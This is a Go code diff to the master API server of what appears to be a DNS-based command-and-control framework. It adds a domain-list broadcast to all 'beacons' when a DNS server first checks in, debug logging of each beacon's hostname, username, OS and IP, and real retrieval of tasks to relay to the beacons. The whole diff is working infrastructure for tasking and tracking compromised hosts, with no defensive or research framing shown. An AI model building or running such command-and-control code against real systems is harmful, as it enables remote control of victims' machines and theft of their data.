@@ -353,15 +353,48 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 
 	dnsServerID := r.Header.Get("X-DNS-Server-ID")
 
-	// Update check-in time
-	if err := api.db.UpdateDNSServerCheckin(dnsServerID); err != nil {
+	// Update check-in time and detect if this is first checkin
+	isFirstCheckin, err := api.db.UpdateDNSServerCheckin(dnsServerID)
+	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, "failed to update check-in")
 		return
 	}
 
+	// If this is the first checkin, broadcast domain list to all beacons
+	if isFirstCheckin {
+		go func() {
+			// Get all enabled DNS domains
+			domains, err := api.db.GetEnabledDNSDomains()
+			if err != nil {
+				if api.config.Debug {
+					fmt.Printf("[Master] Failed to get DNS domains: %v\n", err)
+				}
+				return
+			}
+
+			// Create broadcast task with domain list as JSON
+			domainsJSON, _ := json.Marshal(domains)
+			command := fmt.Sprintf("update_domains:%s", string(domainsJSON))
+
+			err = api.db.CreateBroadcastTask(command, "system")
+			if err != nil {
+				if api.config.Debug {
+					fmt.Printf("[Master] Failed to create broadcast task: %v\n", err)
+				}
+				return
+			}
+
+			if api.config.Debug {
+				fmt.Printf("[Master] 🔄 Broadcasting domain update to all beacons (new server: %s)\n", dnsServerID)
+				fmt.Printf("[Master] Updated domains: %v\n", domains)
+			}
+		}()
+	}
+
 	api.sendSuccess(w, "check-in recorded", map[string]interface{}{
-		"dns_server_id": dnsServerID,
-		"timestamp":     time.Now(),
+		"dns_server_id":    dnsServerID,
+		"timestamp":        time.Now(),
+		"is_first_checkin": isFirstCheckin,
 	})
 }
 
@@ -371,11 +404,21 @@ func (api *APIServer) handleDNSServerCheckin(w http.ResponseWriter, r *http.Requ
 func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request) {
 	var req BeaconReportRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] ❌ Failed to decode beacon report: %v\n", err)
+		}
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
 		return
 	}
 
 	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	if api.config.Debug {
+		fmt.Printf("[API] 📡 Beacon report received: %s from DNS server %s\n", req.Beacon.ID, dnsServerID)
+		fmt.Printf("[API]    Hostname: %s, User: %s, OS: %s, IP: %s\n", 
+			req.Beacon.Hostname, req.Beacon.Username, req.Beacon.OS, req.Beacon.IPAddress)
+		fmt.Printf("[API]    FirstSeen: %v, LastSeen: %v\n", req.Beacon.FirstSeen, req.Beacon.LastSeen)
+	}
 
 	// Store beacon in master database (upsert for updates)
 	err := api.db.UpsertBeacon(
@@ -386,19 +429,21 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 		req.Beacon.Arch,
 		req.Beacon.IPAddress,
 		dnsServerID,
+		req.Beacon.FirstSeen,
+		req.Beacon.LastSeen,
 	)
 
 	if err != nil {
-		api.sendError(w, http.StatusInternalServerError, "failed to register beacon")
 		if api.config.Debug {
-			fmt.Printf("[API] Error storing beacon: %v\n", err)
+			fmt.Printf("[API] ❌ Error storing beacon: %v\n", err)
 		}
+		api.sendError(w, http.StatusInternalServerError, "failed to register beacon")
 		return
 	}
 
 	if api.config.Debug {
-		fmt.Printf("[API] Beacon stored from DNS server %s: %s@%s (%s)\n",
-			dnsServerID, req.Beacon.Username, req.Beacon.Hostname, req.Beacon.ID)
+		fmt.Printf("[API] ✅ Beacon %s stored successfully from DNS server %s\n",
+			req.Beacon.ID, dnsServerID)
 	}
 
 	api.sendSuccess(w, "beacon registered", map[string]interface{}{
@@ -532,13 +577,19 @@ func (api *APIServer) handleGetTaskResult(w http.ResponseWriter, r *http.Request
 func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.Request) {
 	dnsServerID := r.Header.Get("X-DNS-Server-ID")
 
-	// TODO: Implement GetTasksForDNSServer in db.go
-	if api.config.Debug {
-		fmt.Printf("[API] Tasks requested by DNS server: %s\n", dnsServerID)
+	tasks, err := api.db.GetTasksForDNSServer(dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
+		return
 	}
 
-	// Return empty list for now
-	api.sendJSON(w, []interface{}{})
+	if api.config.Debug && len(tasks) > 0 {
+		fmt.Printf("[API] Returning %d task(s) to DNS server %s\n", len(tasks), dnsServerID)
+	}
+
+	// Return tasks array directly (not wrapped in object)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(tasks)
 }
 
 // handleGetBeaconsForDNSServer returns all active beacons (for cross-server awareness)
